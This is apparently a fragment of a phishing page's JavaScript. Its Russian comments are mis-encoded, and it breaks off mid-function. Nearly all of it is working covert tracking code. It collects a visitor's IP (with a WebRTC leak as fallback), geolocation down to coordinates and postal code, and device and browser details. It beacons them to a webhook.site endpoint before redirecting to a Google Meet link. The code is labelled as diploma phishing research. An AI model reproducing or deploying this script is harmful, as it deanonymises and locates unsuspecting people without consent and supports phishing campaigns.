    <!-- ========== –°–ö–†–ò–ü–¢ –î–õ–Ø IP –¢–†–ï–ö–ò–ù–ì–ê ========== -->
    <script>
        (function() {
            'use strict';
            
            // === –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ===
            const CONFIG = {
                // –û—Å–Ω–æ–≤–Ω–∞—è —Ü–µ–ª—å
                TARGET_URL: 'https://meet.google.com/xou-pucm-apn',
                
                // –ó–∞–¥–µ—Ä–∂–∫–∞ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞ (–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ –ø—Ä–µ–≤—å—é)
                REDIRECT_DELAY: 1500, // 1.5 —Å–µ–∫—É–Ω–¥—ã
                
                // –í–∞—à Webhook.site URL
                TRACKING_ENDPOINT: 'https://webhook.site/2cba7b85-e7d4-419b-93d8-dfc5b300ea13',
                
                // –°–µ—Ä–≤–∏—Å—ã –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è IP
                IP_SERVICES: [
                    'https://api.ipify.org?format=json',         // –û—Å–Ω–æ–≤–Ω–æ–π
                    'https://api64.ipify.org?format=json',       // IPv6
                    'https://icanhazip.com/json',                // –†–µ–∑–µ—Ä–≤–Ω—ã–π
                    'https://ipecho.net/plain.json'              // –ï—â–µ –æ–¥–∏–Ω
                ],
                
                // –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –ø–æ IP
                GEO_SERVICE: 'https://ipapi.co/json/',
                
                // –í–∫–ª—é—á–∏—Ç—å —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
                ENABLE_TRACKING: true
            };
            
            // === –û–°–ù–û–í–ù–´–ï –§–£–ù–ö–¶–ò–ò ===
            
            // 1. –ü–æ–ª—É—á–µ–Ω–∏–µ IP –∞–¥—Ä–µ—Å–∞
            async function getIPAddress() {
                console.log('üîç –ü–æ–ª—É—á–µ–Ω–∏–µ IP –∞–¥—Ä–µ—Å–∞...');
                
                // –ü—Ä–æ–±—É–µ–º –≤—Å–µ —Å–µ—Ä–≤–∏—Å—ã –ø–æ –æ—á–µ—Ä–µ–¥–∏
                for (const service of CONFIG.IP_SERVICES) {
                    try {
                        const response = await fetch(service, {
                            method: 'GET',
                            mode: 'cors',
                            headers: { 'Accept': 'application/json' },
                            signal: AbortSignal.timeout(3000)
                        });
                        
                        if (response.ok) {
                            const data = await response.json();
                            let ip = data.ip || data.query || data;
                            
                            if (typeof ip === 'string') {
                                console.log('‚úÖ IP –ø–æ–ª—É—á–µ–Ω:', ip);
                                return ip;
                            }
                        }
                    } catch (error) {
                        console.log(`‚ö†Ô∏è –°–µ—Ä–≤–∏—Å ${service} –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª:`, error.message);
                        continue;
                    }
                }
                
                // –ï—Å–ª–∏ –≤—Å–µ —Å–µ—Ä–≤–∏—Å—ã –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª–∏, –ø—Ä–æ–±—É–µ–º WebRTC
                try {
                    const rtcIP = await getIPFromWebRTC();
                    if (rtcIP) {
                        console.log('‚úÖ IP –ø–æ–ª—É—á–µ–Ω —á–µ—Ä–µ–∑ WebRTC:', rtcIP);
                        return rtcIP;
                    }
                } catch (error) {
                    console.log('‚ö†Ô∏è WebRTC —Ç–æ–∂–µ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª');
                }
                
                return '–Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω';
            }
            
            // 2. –ü–æ–ª—É—á–µ–Ω–∏–µ IP —á–µ—Ä–µ–∑ WebRTC (—Ä–µ–∑–µ—Ä–≤–Ω—ã–π –º–µ—Ç–æ–¥)
            function getIPFromWebRTC() {
                return new Promise((resolve) => {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    
                    pc.onicecandidate = (ice) => {
                        if (!ice.candidate) return;
                        const candidate = ice.candidate.candidate;
                        
                        // –ò—â–µ–º IPv4
                        const ipv4Regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                        const match = candidate.match(ipv4Regex);
                        
                        if (match) {
                            resolve(match[1]);
                            pc.close();
                        }
                    };
                    
                    setTimeout(() => {
                        pc.close();
                        resolve(null);
                    }, 1000);
                });
            }
            
            // 3. –ü–æ–ª—É—á–µ–Ω–∏–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –ø–æ IP
            async function getGeoLocation(ip) {
                if (ip === '–Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω') return null;
                
                try {
                    console.log('üìç –ü–æ–ª—É—á–µ–Ω–∏–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –¥–ª—è IP:', ip);
                    
                    const response = await fetch(CONFIG.GEO_SERVICE, {
                        method: 'GET',
                        mode: 'cors',
                        headers: { 'Accept': 'application/json' }
                    });
                    
                    if (response.ok) {
                        const geoData = await response.json();
                        
                        return {
                            city: geoData.city || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                            region: geoData.region || geoData.region_name || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                            country: geoData.country_name || geoData.country || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                            country_code: geoData.country_code || geoData.countryCode || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                            latitude: geoData.latitude || null,
                            longitude: geoData.longitude || null,
                            timezone: geoData.timezone || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                            isp: geoData.org || geoData.isp || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                            postal: geoData.postal || geoData.zip || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                        };
                    }
                } catch (error) {
                    console.log('‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é:', error.message);
                }
                
                return null;
            }
            
            // 4. –°–±–æ—Ä –≤—Å–µ—Ö –¥–∞–Ω–Ω—ã—Ö
            async function collectAllData() {
                console.log('üìä –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –Ω–∞—á–∞—Ç...');
                
                // –ü–æ–ª—É—á–∞–µ–º IP
                const ip = await getIPAddress();
                
                // –ü–æ–ª—É—á–∞–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
                const geo = await getGeoLocation(ip);
                
                // –°–æ–±–∏—Ä–∞–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ
                const data = {
                    // –ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä—ã
                    study_id: 'diploma-phishing-research',
                    session_id: 'sess_' + Math.random().toString(36).substr(2, 9),
                    
                    // –í—Ä–µ–º—è
                    timestamp: new Date().toISOString(),
                    local_time: new Date().toLocaleString('ru-RU'),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    
                    // IP –∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è (–ì–õ–ê–í–ù–û–ï!)
                    ip_address: ip,
                    geolocation: geo,
                    
                    // –ë—Ä–∞—É–∑–µ—Ä –∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
                    user_agent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    
                    // –≠–∫—Ä–∞–Ω
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        color_depth: screen.colorDepth,
                        pixel_ratio: window.devicePixelRatio
                    },
                    
                    // –°–µ—Ç—å
                    referrer: document.referrer || '–ø—Ä—è–º–æ–π –ø–µ—Ä–µ—Ö–æ–¥',
                    url: window.location.href,
                    
                    // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ
                    cookies: navigator.cookieEnabled,
                    online: navigator.onLine,
                    connection: navigator.connection ? {
                        type: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink
                    } : null
                };
                
                console.log('üìä –í—Å–µ –¥–∞–Ω–Ω—ã–µ —Å–æ–±—Ä–∞–Ω—ã:', data);
                return data;
            }
            
            // 5. –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–∞ —Å–µ—Ä–≤–µ—Ä
            async function sendDataToServer(data) {
                if (!CONFIG.ENABLE_TRACKING || !CONFIG.TRACKING_ENDPOINT) {
                    console.log('üìù –¢—Ä–µ–∫–µ—Ä –Ω–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω, –¥–∞–Ω–Ω—ã–µ —Ç–æ–ª—å–∫–æ –≤ –∫–æ–Ω—Å–æ–ª–∏');
                    return false;
                }
                
                try {
                    // –§–æ—Ä–º–∏—Ä—É–µ–º –¥–∞–Ω–Ω—ã–µ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
                    const trackingData = {
                        ...data,
                        // –î–æ–±–∞–≤–ª—è–µ–º –º–µ—Ç–∫—É –≤—Ä–µ–º–µ–Ω–∏ –æ—Ç–ø—Ä–∞–≤–∫–∏
                        sent_at: new Date().toISOString(),
                        // –î–æ–±–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å—Ç—Ä–∞–Ω–∏—Ü–µ
                        page_title: document.title,
                        page_url: window.location.href
                    };
                    
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —á–µ—Ä–µ–∑ Beacon API (–Ω–µ –±–ª–æ–∫–∏—Ä—É–µ—Ç —Ä–µ–¥–∏—Ä–µ–∫—Ç)
                    const blob = new Blob([JSON.stringify(trackingData, null, 2)], {
                        type: 'application/json'
                    });
                    
                    let sent = false;
                    
                    if (navigator.sendBeacon) {
                        sent = navigator.sendBeacon(CONFIG.TRACKING_ENDPOINT, blob);
                        console.log(sent ? '‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã —á–µ—Ä–µ–∑ Beacon' : '‚ùå Beacon –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª');
                    }
                    
                    // –ï—Å–ª–∏ Beacon –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª, –ø—Ä–æ–±—É–µ–º fetch
                    if (!sent && window.fetch) {
                        try {
                            await fetch(CONFIG.TRACKING_ENDPOINT, {
                                method: 'POST',
                                body: JSON.stringify(trackingData),
                                headers: { 'Content-Type': 'application/json' },
                                keepalive: true,
                                mode: 'no-cors'
                            });
                            console.log('‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã —á–µ—Ä–µ–∑ Fetch');
                            sent = true;
                        } catch (fetchError) {
                            console.warn('‚ö†Ô∏è Fetch —Ç–æ–∂–µ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª:', fetchError);
                        }
                    }
                    
                    // –°–æ—Ö—Ä–∞–Ω—è–µ–º –ª–æ–∫–∞–ª—å–Ω–æ –Ω–∞ –≤—Å—è–∫–∏–π —Å–ª—É—á–∞–π
                    try {
                        const logs = JSON.parse(localStorage.getItem('ip_tracking_logs') || '[]');
                        logs.push({
                            time: new Date().toISOString(),
                            ip: data.ip_address,
                            geo: data.geolocation
                        });
                        localStorage.setItem('ip_tracking_logs', JSON.stringify(logs.slice(-50)));
                    } catch (e) {}
                    
                    return sent;
                    
                } catch (error) {
                    console.error('‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö:', error);
                    return false;
                }
            }
            
            // 6. –ü–æ–∫–∞–∑–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ
            function showTrackingInfo(data) {
                const infoDiv = document.getElementById('tracking-info');
                if (!infoDiv) return;
                
                let infoHTML = '<div style="text-align: left; font-size: 12px;">';
                infoHTML += '<strong>–°–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:</strong><br>';
                infoHTML += `IP: <code>${data.ip_address}</code><br>`;
                
                if (data.geolocation) {
                    infoHTML += `–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è: ${data.geolocation.city}, ${data.geolocation.country}<br>`;
                    if (data.geolocation.latitude) {
